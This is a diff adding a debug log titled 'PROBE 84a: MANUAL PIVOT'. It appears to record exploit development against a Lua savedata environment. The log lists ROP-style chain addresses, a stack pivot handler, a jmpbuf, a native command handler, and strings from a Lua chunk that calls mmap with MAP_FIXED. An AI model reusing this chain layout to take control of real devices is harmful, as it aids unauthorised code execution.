@@ -1,0 +1,79 @@
+=== PROBE 84a: MANUAL PIVOT ===
+--- NATIVE_INVOKE ---
+type=function
+lua=false
+
+--- FCALL CHAIN STACK ---
+stack_base=0x3110520f0
++0x00=0x641c8042
++0x08=0x641c8992
++0x10=0x311050040
++0x18=0x641e6ebb
++0x20=0x64291dfe
++0x28=0x311051fd0
++0x30=0x6425ac67
++0x38=0x641c8992
++0x40=0x311052348
++0x48=0x64291dfe
++0x50=0x311051fe0
++0x58=0x6425ac67
++0x60=0x641c8992
++0x68=0x3110500b0
++0x70=0x641e6ebb
++0x78=0x64291dfe
+
+--- PIVOT HANDLER CHAIN ---
+stack_base=0xf00000b9
+stack_size=8192
+stack_offset=1752
+jmpbuf=0x311056510
+lock=0x311056500
+lua_state=0x311056538
+enable_mock_push=false
+*stack_base readable=true
+*stack_base=0x641c8042
+
+--- CMD HANDLER ---
+native_cmd_handler=0x311058660
+cmd+0x00=0x641c8042
+cmd+0x08=0x641c8992
+cmd+0x10=0x103fe06e0
+cmd+0x18=0x64291dfe
+cmd+0x20=0x311058540
+cmd+0x28=0x6425ac67
+cmd+0x30=0x641c8992
+cmd+0x38=0x3110586d8
+
+--- MAP_FIXED_ADDRESS ---
+len=934 strings:
+  LuaQ
+  @/savedata0/misc.lua
+  KAC
+  KAC
+  syscall
+  resolve
+  mmap
+  bit32
+  bor
+  MAP_PRIVATE
+  MAP_FIXED
+  MAP_ANONYMOUS
+  PROT_READ
+  PROT_WRITE
+  tonumber
+  error
+  mmap() error: 
+  get_error_string
+  addr
+  size
+  MAP_COMBINED
+  PROT_COMBINED
+  ret
+
+--- STACK PIVOT ---
+SP:1=table: 310f87080
+SP:2=table: 310f87560
+
+--- JMPBUF ---
+jmpbuf addr=0x311054130
+=== PROBE 84a COMPLETE ===
